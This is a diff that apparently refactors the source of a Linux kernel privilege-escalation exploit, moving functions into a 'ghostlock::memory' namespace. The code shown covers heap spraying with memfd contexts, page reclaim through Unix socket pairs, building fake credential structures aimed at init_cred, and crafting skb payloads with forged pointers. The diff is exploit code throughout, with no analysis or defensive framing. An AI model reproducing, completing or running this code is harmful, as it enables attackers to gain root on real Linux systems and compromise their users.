@@ -119,9 +119,9 @@ void log_startup_context(void) {
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)resolved_addresses_kernel_phys_load(
+             (unsigned long long)ghostlock::memory::resolved_addresses_kernel_phys_load(
                  &g_resolved_addresses),
-             (unsigned long long)(resolved_addresses_kernel_phys_load(
+             (unsigned long long)(ghostlock::memory::resolved_addresses_kernel_phys_load(
                  &g_resolved_addresses) -
                                   P0_PHYS_OFFSET),
              (unsigned long long)SLIDE_NFULNL_LOGGER,
@@ -156,12 +156,12 @@ long sched_setattr_tid(int tid, int nice_value) {
 }
 
 /* Decoupling plan: resolve physical/image address mapping. Input: target
- * profile; output: ResolvedAddresses. Future: resolve_runtime_addresses(). */
+ * profile; output: ghostlock::memory::ResolvedAddresses. Future: resolve_runtime_addresses(). */
 void init_p0_profile(void) {
   pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
-          (unsigned long long)resolved_addresses_kernel_phys_load(
+          (unsigned long long)ghostlock::memory::resolved_addresses_kernel_phys_load(
               &g_resolved_addresses),
-          (unsigned long long)(resolved_addresses_kernel_phys_load(
+          (unsigned long long)(ghostlock::memory::resolved_addresses_kernel_phys_load(
               &g_resolved_addresses) -
                                P0_PHYS_OFFSET));
 }
@@ -207,7 +207,7 @@ static int fill_profile_cred_copy(unsigned char *p, size_t off) {
       return 0;
     }
     put64(c, ref_offsets[i],
-          resolved_addresses_data_alias(&g_resolved_addresses, ref_images[i]));
+          ghostlock::memory::resolved_addresses_data_alias(&g_resolved_addresses, ref_images[i]));
   }
   return 1;
 }
@@ -259,64 +259,64 @@ void kill_child(pid_t child) {
 }
 
 /* Decoupling plan: release the current reclaim socket pair. Input/output: heap
- * context. Future: reclaim_pair_destroy(ReclaimPair *). */
+ * context. Future: reclaim_pair_destroy(ghostlock::memory::ReclaimPair *). */
 void close_reclaim_sockets(void) {
-  payload_page_destroy(&g_heap_context.current);
+  ghostlock::memory::payload_page_destroy(&g_heap_context.current);
 }
 
 /* Decoupling plan: transfer current reclaim sockets into quarantine. Input:
  * heap context; output: transfer status. Future: reclaim_pair_quarantine(). */
 int quarantine_reclaim_sockets(void) {
-  return payload_page_move(&g_heap_context.quarantine,
+  return ghostlock::memory::payload_page_move(&g_heap_context.quarantine,
                            &g_heap_context.current,
-                           PAYLOAD_PAGE_QUARANTINED);
+                           ghostlock::memory::PAYLOAD_PAGE_QUARANTINED);
 }
 
 /* Decoupling plan: release all quarantined reclaim ownership. Input/output:
  * heap context. Future: heap_context_release_quarantine(). */
 void release_quarantined_reclaim_sockets(void) {
-  payload_page_destroy(&g_heap_context.quarantine);
+  ghostlock::memory::payload_page_destroy(&g_heap_context.quarantine);
 }
 
 /* Decoupling plan: move the current payload page into the prebuilt slot. Input:
- * heap context; output: move status. Future: payload_page_move(prebuilt,current). */
+ * heap context; output: move status. Future: ghostlock::memory::payload_page_move(prebuilt,current). */
 int stash_prebuilt_page(void) {
-  return payload_page_move(&g_heap_context.prebuilt,
+  return ghostlock::memory::payload_page_move(&g_heap_context.prebuilt,
                            &g_heap_context.current,
-                           PAYLOAD_PAGE_PREBUILT);
+                           ghostlock::memory::PAYLOAD_PAGE_PREBUILT);
 }
 
 /* Decoupling plan: move the prebuilt page into the active slot. Input/output:
  * heap context; output: activation status. Future: heap_activate_prebuilt_page(). */
 int activate_prebuilt_page(void) {
-  if (!payload_page_has_reclaim(&g_heap_context.prebuilt)) return 0;
+  if (!ghostlock::memory::payload_page_has_reclaim(&g_heap_context.prebuilt)) return 0;
   close_reclaim_sockets();
-  return payload_page_move(&g_heap_context.current,
+  return ghostlock::memory::payload_page_move(&g_heap_context.current,
                            &g_heap_context.prebuilt,
-                           PAYLOAD_PAGE_CURRENT);
+                           ghostlock::memory::PAYLOAD_PAGE_CURRENT);
 }
 
 /* Decoupling plan: destroy the prebuilt page and its reclaim pair. Input/output:
- * heap context. Future: payload_page_destroy(&context->prebuilt). */
+ * heap context. Future: ghostlock::memory::payload_page_destroy(&context->prebuilt). */
 void discard_prebuilt_page(void) {
-  payload_page_destroy(&g_heap_context.prebuilt);
+  ghostlock::memory::payload_page_destroy(&g_heap_context.prebuilt);
 }
 
-/* Decoupling plan: clean one heap-preparation attempt. Input: HeapContext;
+/* Decoupling plan: clean one heap-preparation attempt. Input: ghostlock::memory::HeapContext;
  * output: all attempt-owned resources released. Future:
  * heap_context_reset_attempt(), separate from route cleanup. */
 void cleanup_page_prepare_state(void) {
-  close_ctx_memfds(&prepare_ctx);
-  close_ctx_memfds(&spray_ctx);
-  close_ctx_memfds(&pre_ctx);
-  close_ctx_memfds(&post_ctx);
+  ghostlock::memory::close_ctx_memfds(&prepare_ctx);
+  ghostlock::memory::close_ctx_memfds(&spray_ctx);
+  ghostlock::memory::close_ctx_memfds(&pre_ctx);
+  ghostlock::memory::close_ctx_memfds(&post_ctx);
   if (g_heap_context.leak_memfd.get() > 0) {
     g_heap_context.leak_memfd.reset();
   }
-  free_ctx_storage(&prepare_ctx);
-  free_ctx_storage(&spray_ctx);
-  free_ctx_storage(&pre_ctx);
-  free_ctx_storage(&post_ctx);
+  ghostlock::memory::free_ctx_storage(&prepare_ctx);
+  ghostlock::memory::free_ctx_storage(&spray_ctx);
+  ghostlock::memory::free_ctx_storage(&pre_ctx);
+  ghostlock::memory::free_ctx_storage(&post_ctx);
   g_heap_context.skb_buffer.reset();
 }
 
@@ -330,7 +330,7 @@ int clone_memfd(void) {
 }
 
 /* Decoupling plan: allocate the four mm-context sets used for heap shaping.
- * Inputs: profile and HeapContext; output: initialized sets/status. Future:
+ * Inputs: profile and ghostlock::memory::HeapContext; output: initialized sets/status. Future:
  * heap_context_prepare_mm_sets(), returning errors instead of exiting. */
 void prepare_ctxs(void) {
   prepare_ctx.childs.assign(8 * mm_objs_per_slab, 0);
@@ -367,8 +367,8 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
       payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
   PayloadWriteLayout write_layout = payload_write_layout(
       request, base, default_fops, credential_fops,
-      resolved_addresses_data_alias(&g_resolved_addresses,
-                                    resolved_addresses_init_cred_image(
+      ghostlock::memory::resolved_addresses_data_alias(&g_resolved_addresses,
+                                    ghostlock::memory::resolved_addresses_init_cred_image(
                                         &g_resolved_addresses)));
   (g_heap_context.current.fake_parent) = write_layout.parent;
   (g_heap_context.current.fake_right) = write_layout.right;
@@ -475,7 +475,7 @@ int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
 }
 
 /* Decoupling plan: perform one complete heap-shaping/page-reclaim attempt.
- * Inputs: HeapContext, profile and payload request; output: PayloadPage/status.
+ * Inputs: ghostlock::memory::HeapContext, profile and payload request; output: ghostlock::memory::PayloadPage/status.
  * Future: heap_context_prepare_payload_page(), with unique resource ownership. */
 uintptr_t prepare_kernel_page(const WriteRequest *request) {
   struct timespec t_spray;
@@ -632,7 +632,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
-  g_heap_context.current.state = PAYLOAD_PAGE_CURRENT;
+  g_heap_context.current.state = ghostlock::memory::PAYLOAD_PAGE_CURRENT;
   int sndbuf = 1 << 20;
   setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
@@ -700,7 +700,7 @@ uintptr_t prepare_kernel_page(const WriteRequest *request) {
 }
 
 /* Decoupling plan: retry heap preparation until a usable page is available.
- * Inputs: HeapContext and request; output: PayloadPage/status. Future:
+ * Inputs: ghostlock::memory::HeapContext and request; output: ghostlock::memory::PayloadPage/status. Future:
  * heap_context_prepare_verified_page(), separating retry policy from one attempt. */
 uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
   const struct execution_settings *execution =
